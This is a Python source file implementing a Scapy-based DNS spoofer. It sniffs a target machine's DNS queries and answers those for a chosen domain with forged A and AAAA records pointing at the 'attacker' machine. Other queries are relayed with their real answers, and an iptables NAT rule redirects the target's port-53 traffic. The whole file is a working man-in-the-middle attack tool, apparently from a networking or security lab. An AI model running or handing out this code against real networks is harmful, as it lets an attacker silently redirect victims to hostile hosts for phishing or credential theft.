from scapy.all import *

class DNSSpoofer:
    """
    DNS Spoofer class
    Creating:
        Always provide an interface if possible, otherwise it will pick the scapy default.
        new_dns_ip and new_dns_ip6 are the ip addresses that any spoofed DNS record will point towards.
        These do not have to be given if the spoofed ip is the ip of the current machine.
    Starting:
        Just call the start() method
    Stopping:
        Just call the stop() method. Calling this before start() does nothing.
    """

    def __init__(self, target_ip: str, target_domain: str, bpf_filtering: bool = True, interface: str = conf.iface, new_dns_ip: str = '', new_dns_ip6: str = '') -> None:
        self.target_ip = target_ip
        self.interface = interface
        self.target_domain = target_domain
        self.new_dns_ip = new_dns_ip if new_dns_ip else get_if_addr(interface)
        self.new_dns_ip6 = new_dns_ip6 if new_dns_ip6 else get_if_addr6(interface)
        self.bpf_filtering = bpf_filtering

    def is_supported_type(self, id: int) -> bool:
        return (
            (id == 1 and self.new_dns_ip) or    # A
            (id == 28 and self.new_dns_ip6)     # AAAA
        )

    def record_type_id_to_name(self, id: int) -> str:
        """
        Convert type ID to name for readability
        For now, only common onces are included
        https://en.wikipedia.org/wiki/List_of_DNS_record_types
        """
        typeMap = {
            1: 'A',
            28: 'AAAA',
            5: 'CNAME',
            39: 'DNAME',
            15: 'MX',
            33: 'SRV',
            16: 'TXT'
        }

        if id in typeMap:
            return typeMap[id]
        else:
            return str(id)

    def is_incoming(self, pkt: Packet) -> bool:
        """Filter to check, whether a packet is (supposedly) incoming, and not from this interface"""
        if Ether in pkt:
            return pkt[Ether].src == get_if_hwaddr(self.interface)
        else:
            return False
    
    def is_dns(self, pkt: Packet) -> bool:
        """Does what it says, used as filter for the sniffer. Note that we only check for UDP DNS"""
        return DNS in pkt and UDP in pkt

    def is_from_target(self, pkt: Packet) -> bool:
        """Filter to check, whether a packet is (supposedly) from the target"""
        if IP in pkt:
            return pkt[IP].src == self.target_ip
        else:
            return False

    def is_target_domain(self, pkt: Packet) -> bool:
        """Whether a DNS message is querying the targeted domain"""
        if DNS in pkt:
            for i in range(int(pkt[DNS].qdcount)):
                name = str(pkt[DNS].qd[i].qname)
                print(name)
                if self.target_domain in name:
                    return True
            
        return False
    
    def is_to_attacker(self, pkt: Packet) -> bool:
        """Whether a packet is directly aimed at the attacker (this machine)"""
        if IP in pkt:
            return pkt[IP].dst == get_if_addr(self.interface)
        else:
            return False

    def get_spoof_packet(self, req_pkt: Packet, name: str, recordType: str) -> Packet:
        """Generate one spoofed DNS response packet in response to a particular request"""
        res_pkt: Packet = (
            IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src) /
            UDP(sport=req_pkt[UDP].dport, dport=req_pkt[UDP].sport)
        )

        if recordType == 1:
            # type: A
            res_pkt /= DNS(id=req_pkt[DNS].id, qd=DNSQR(qname=name, qtype=recordType), an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip), qr=1)
            print(f'Sending back response to {req_pkt[IP].src} with {self.record_type_id_to_name(recordType)} record: {self.new_dns_ip}')
        elif recordType == 28:
            # type: AAAA
            res_pkt /= DNS(id=req_pkt[DNS].id, qd=DNSQR(qname=name, qtype=recordType), an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip6), qr=1)
            print(f'Sending back response to {req_pkt[IP].src} with {self.record_type_id_to_name(recordType)} record: {self.new_dns_ip6}')


        return res_pkt

    def spoof_dns_request(self, pkt: Packet) -> None:
        """For a sniffed DNS packet, generate and send spoofed DNS responses for each requested record"""
        if pkt and DNS in pkt and IP in pkt and Ether in pkt:
            for i in range(int(pkt[DNS].qdcount)):
                # qdcount = the number of requested records
                name = pkt[DNS].qd[i].qname
                recordType = pkt[DNS].qd[i].qtype
                print(f'Received DNS request from {pkt[IP].src} for {name} of type {self.record_type_id_to_name(recordType)}')
                if self.is_supported_type(recordType):
                    res_pkt = self.get_spoof_packet(pkt, name, recordType)
                    send(res_pkt, iface=self.interface, verbose=False)
                else:
                    print('Type not supported, ignoring...')

    def handle_dns_packet(self, pkt: Packet) -> None:
        """
            Handle a single DNS package, doing one of three things:
            - Spoof with fake ip address
            - Spoof with legitimate record
            - Ignore
        """
        if self.is_from_target(pkt) and self.is_target_domain(pkt) and not self.is_to_attacker(pkt):
            # Is from targeted machine, and is a request for targeted domain
            print(f'Spoof DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
            self.spoof_dns_request(pkt)
        elif pkt[DNS].qr == 0 and pkt[DNS].opcode == 0 and self.is_from_target(pkt):
            # Any other DNS request, get the real response from Google first
            print(f'Forward DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
            spoofed_req: Packet = (
                IP(dst=pkt[IP].dst) /
                UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) /
                DNS(id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname, qtype=pkt[DNSQR].qtype), qdcount=1, rd=1)
            )

            real_res: Packet = sr1(spoofed_req, inter=1, retry=3, timeout=1, verbose=True)

            if real_res and DNS in real_res:
                # Got the real response from DNS server
                print(f'Got back response for {str(pkt[DNSQR].qname)}')
                spoofed_res: Packet = (
                    IP(dst=pkt[IP].src, src=real_res[IP].src) /
                    UDP(dport=pkt[UDP].sport) /
                    DNS()
                )

                spoofed_res[DNS] = real_res[DNS]
                
                # Send spoofed response with legitimate data
                send(spoofed_res, iface=self.interface, verbose=False)
            else:
                print(f'No response for {str(pkt[DNSQR].qname)}')

    def set_packet_forwarding(self, value: bool) -> None:
        """This function turns on or turns off IP (packet) forwarding depending on the value given"""
        if platform == 'linux' or platform == 'linux2':
            os.system(f'iptables -t nat -{"A" if value else "D"} PREROUTING -s {self.target_ip} -p udp --destination-port 53 -j REDIRECT')
        else:
            print("Cannot turn on IP forwarding automatically...")
    
    def start(self) -> None:
        """
            Start an asynchronous sniffer, use the stop() method to stop this
            BPF filtering has better performance, but does not work with all interfaces, like virtualbox interfaces
        """
        if self.bpf_filtering:
            self.sniffer = AsyncSniffer(iface=self.interface, prn=self.handle_dns_packet, filter='udp and port 53', store=False)
        else:
            self.sniffer = AsyncSniffer(iface=self.interface, prn=self.handle_dns_packet, lfilter=self.is_dns, store=False)
        self.sniffer.start()
        self.set_packet_forwarding(True)
        print("DNS spoofing started")

    def stop(self) -> None:
        """Stop the async sniffer"""
        self.set_packet_forwarding(False)
        if self.sniffer:
            self.sniffer.stop()
            print("DNS spoofing stopped")
        else:
            print('DNS spoofing has to be started, before it can be stopped')
